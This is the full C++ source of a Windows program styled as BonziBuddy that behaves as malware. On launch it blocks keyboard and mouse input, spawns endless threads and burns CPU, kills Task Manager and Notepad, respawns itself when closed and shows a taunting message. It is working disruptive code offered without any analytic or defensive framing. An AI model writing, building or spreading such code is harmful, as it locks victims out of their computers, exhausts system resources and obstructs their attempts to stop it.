#include <windows.h>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <thread>
#include <string>
#include <vector>
#include <mmsystem.h>
#include "resource.h"

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")

using namespace Gdiplus;

Image* bonziImage = nullptr;
UINT frameCount = 0;
UINT currentFrame = 0;
bool inputBoxShown = false;
GUID* dimensionIDs = nullptr;
UINT frameDelay = 100;

HFONT hHackerFont = nullptr;
HBRUSH hBrush = nullptr;
COLORREF textColor = RGB(255, 0, 0);
COLORREF bgColor = RGB(0, 0, 0);

void LaunchSelf(bool asChild = true);
bool IsProcessRunning(const wchar_t* processName);
LRESULT CALLBACK MessageBoxProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void ShowBigMessageBox(const std::wstring& title, const std::wstring& message);
void MessageboxLOL();
void StartMessageboxLOL();
Image* LoadImageFromResource(HINSTANCE hInstance, int resourceID, const wchar_t* resourceType);
void MonitorSelf();
void SpawnThreads();
void ConsumeCPU();
UINT GetGifFrameDelay(Image* image);
void CloseMessageBox(const wchar_t* messageBoxTitle, int delayMs);
void ToggleInput();
void AdvanceGifFrame(Image* image);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);

// Function Implementations
void LaunchSelf(bool asChild) {
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(nullptr, szFileName, MAX_PATH);
    ShellExecute(nullptr, L"open", szFileName, asChild ? L"--child" : nullptr, nullptr, SW_SHOWNORMAL);
}

bool IsProcessRunning(const wchar_t* processName) {
    bool found = false;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = {};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                    found = true;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return found;
}

LRESULT CALLBACK MessageBoxProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CTLCOLORSTATIC: {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, textColor);
        SetBkColor(hdcStatic, bgColor);

        if (!hHackerFont) {
            hHackerFont = CreateFont(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_MODERN, L"Courier New");
        }
        SelectObject(hdcStatic, hHackerFont);

        if (!hBrush) {
            hBrush = CreateSolidBrush(bgColor);
        }
        return (LRESULT)hBrush;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK) {
            DestroyWindow(hwnd);
        }
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        if (hHackerFont) DeleteObject(hHackerFont);
        if (hBrush) DeleteObject(hBrush);
        return 0;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

void ShowBigMessageBox(const std::wstring& title, const std::wstring& message) {
    const wchar_t CLASS_NAME[] = L"BigMessageBoxClass";
    WNDCLASS wc = {};
    wc.lpfnWndProc = MessageBoxProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClass(&wc);

    HWND hwndMessageBox = CreateWindowEx(WS_EX_DLGMODALFRAME | WS_EX_TOPMOST, CLASS_NAME, title.c_str(), WS_VISIBLE | WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 400, 200, nullptr, nullptr, GetModuleHandle(nullptr), nullptr);

    CreateWindow(L"STATIC", message.c_str(), WS_VISIBLE | WS_CHILD | SS_LEFT, 20, 20, 360, 100, hwndMessageBox, nullptr, GetModuleHandle(nullptr), nullptr);
    CreateWindow(L"BUTTON", L"OK", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 150, 130, 100, 30, hwndMessageBox, (HMENU)IDOK, GetModuleHandle(nullptr), nullptr);

    RECT rc;
    GetWindowRect(hwndMessageBox, &rc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    SetWindowPos(hwndMessageBox, HWND_TOP, (screenWidth - (rc.right - rc.left)) / 2, (screenHeight - (rc.bottom - rc.top)) / 2, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

    ShowWindow(hwndMessageBox, SW_SHOWNORMAL);
    UpdateWindow(hwndMessageBox);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hBrush) DeleteObject(hBrush);
}

void MessageboxLOL() {
    if (!inputBoxShown) {
        ShowBigMessageBox(L"", L"Oh, you thought you could escape me? BonziBuddy is forever! Now sit back, relax, and enjoy the ride – another monkey is about to join the party!");
        inputBoxShown = true;
    }
}

void StartMessageboxLOL() {
    std::thread([]() { MessageboxLOL(); }).detach();
}

Image* LoadImageFromResource(HINSTANCE hInstance, int resourceID, const wchar_t* resourceType) {
    HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(resourceID), resourceType);
    if (!hResource) return nullptr;

    HGLOBAL hMemory = LoadResource(hInstance, hResource);
    if (!hMemory) return nullptr;

    DWORD size = SizeofResource(hInstance, hResource);
    void* data = LockResource(hMemory);

    HGLOBAL hBuffer = GlobalAlloc(GMEM_MOVEABLE, size);
    if (!hBuffer) return nullptr;

    void* buffer = GlobalLock(hBuffer);
    memcpy(buffer, data, size);
    GlobalUnlock(hBuffer);

    IStream* pStream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(hBuffer, TRUE, &pStream))) {
        GlobalFree(hBuffer);
        return nullptr;
    }

    Image* image = new Image(pStream);
    pStream->Release();
    return image;
}

void MonitorSelf() {
    TCHAR szFileName[MAX_PATH];
    GetModuleFileName(nullptr, szFileName, MAX_PATH);

    while (true) {
        HWND hwnd = FindWindow(nullptr, L"BonziBuddyWindow");
        if (!hwnd) {
            ShellExecute(nullptr, L"open", szFileName, nullptr, nullptr, SW_SHOWNORMAL);
        }
        Sleep(1000);
    }
}

void SpawnThreads() {
    while (true) {
        std::thread([]() { while (true) Sleep(1000); }).detach();
        Sleep(5);
    }
}

void ConsumeCPU() {
    while (true) {
        volatile double x = 0;
        for (int i = 0; i < 1'000'000; i++) {
            x += 1.0 / (i + 1);
        }
    }
}

UINT GetGifFrameDelay(Image* image) {
    UINT delay = 100;
    PropertyItem* propertyItem = nullptr;

    UINT size = image->GetPropertyItemSize(PropertyTagFrameDelay);
    if (size > 0) {
        propertyItem = (PropertyItem*)malloc(size);
        if (image->GetPropertyItem(PropertyTagFrameDelay, size, propertyItem) == Ok) {
            delay = ((UINT*)propertyItem->value)[0] * 10;
        }
        free(propertyItem);
    }

    return delay;
}

void CloseMessageBox(const wchar_t* messageBoxTitle, int delayMs) {
    std::thread([messageBoxTitle, delayMs]() {
        Sleep(delayMs);
        HWND hMsgBox = FindWindow(nullptr, messageBoxTitle);
        if (hMsgBox != nullptr) {
            SendMessage(hMsgBox, WM_CLOSE, 0, 0);
        }
        }).detach();
}

void ToggleInput() {
    BlockInput(TRUE);
}

void AdvanceGifFrame(Image* image) {
    if (image == nullptr || frameCount <= 1) return;

    GUID* dimensions = dimensionIDs;
    image->SelectActiveFrame(dimensions, (currentFrame + 1) % frameCount);
    currentFrame = (currentFrame + 1) % frameCount;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_SYSCOMMAND:
        if (wParam == SC_CLOSE) {
            LaunchSelf(false);
            MessageboxLOL();
            return 0;
        }
        break;

    case WM_CREATE: {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        bool isChild = reinterpret_cast<bool>(pCreate->lpCreateParams);
        SetTimer(hwnd, 4, 10, nullptr);
        if (!isChild) {
            SetTimer(hwnd, 3, 30000, nullptr);
        }
        ToggleInput();

        if (!PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(nullptr), SND_RESOURCE | SND_ASYNC | SND_LOOP)) {
            MessageBox(nullptr, L"Failed to play sound!", L"Error", MB_OK | MB_ICONERROR);
        }

        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

        HINSTANCE hInstance = GetModuleHandle(nullptr);
        bonziImage = LoadImageFromResource(hInstance, IDR_GIF1, L"GIF");

        if (bonziImage) {
            frameCount = bonziImage->GetFrameCount(&FrameDimensionTime);
            dimensionIDs = (GUID*)&FrameDimensionTime;
            frameDelay = GetGifFrameDelay(bonziImage);
        }

        SetTimer(hwnd, 1, frameDelay, nullptr);
        SetTimer(hwnd, 2, 100, nullptr);

        std::thread(SpawnThreads).detach();
        std::thread(ConsumeCPU).detach();
        return 0;
    }

    case WM_TIMER:
        if (wParam == 1) {
            AdvanceGifFrame(bonziImage);
            InvalidateRect(hwnd, nullptr, TRUE);
        }
        else if (wParam == 2) {
            POINT cursorPos;
            GetCursorPos(&cursorPos);
            SetWindowPos(hwnd, nullptr, cursorPos.x - 300, cursorPos.y - 300, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
        }
        else if (wParam == 3) {
            LaunchSelf();
            KillTimer(hwnd, 3);
        }
        else if (wParam == 4) {
            const std::vector<std::wstring> processesToKill = { L"Taskmgr.exe", L"notepad.exe", L"notepad.exe" };
            if (IsProcessRunning(L"Taskmgr.exe")) {
                StartMessageboxLOL();
                LaunchSelf(false);

                HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (hSnapshot != INVALID_HANDLE_VALUE) {
                    PROCESSENTRY32 pe32 = {};
                    pe32.dwSize = sizeof(PROCESSENTRY32);

                    if (Process32First(hSnapshot, &pe32)) {
                        do {
                            for (const auto& processName : processesToKill) {
                                if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                                    if (hProcess) {
                                        TerminateProcess(hProcess, 0);
                                        CloseHandle(hProcess);
                                        wprintf(L"Terminated process: %s\n", processName.c_str());
                                    }
                                }
                            }
                        } while (Process32Next(hSnapshot, &pe32));
                    }
                    CloseHandle(hSnapshot);
                }
                KillTimer(hwnd, 4);
            }
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        if (bonziImage) {
            Graphics graphics(hdc);
            graphics.DrawImage(bonziImage, 0, 0, bonziImage->GetWidth(), bonziImage->GetHeight());
        }

        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DESTROY:
        delete bonziImage;
        PostQuitMessage(0);
        return 0;

    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const wchar_t CLASS_NAME[] = L"BonziBuddyWindow";
    bool isChild = (strcmp(lpCmdLine, "--child") == 0);

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(0, 0, 0));
    RegisterClass(&wc);

    bonziImage = LoadImageFromResource(hInstance, IDR_GIF1, L"GIF");
    if (!bonziImage) {
        MessageBox(nullptr, L"Failed to load GIF resource!", L"Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    HWND hwnd = CreateWindowEx(WS_EX_LAYERED | WS_EX_TOOLWINDOW, CLASS_NAME, L"BonziBuddy", WS_POPUP, CW_USEDEFAULT, CW_USEDEFAULT, 1000, 1000, nullptr, nullptr, hInstance, reinterpret_cast<LPVOID>(isChild));
    if (!hwnd) return 0;

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    GdiplusShutdown(gdiplusToken);
    return 0;
}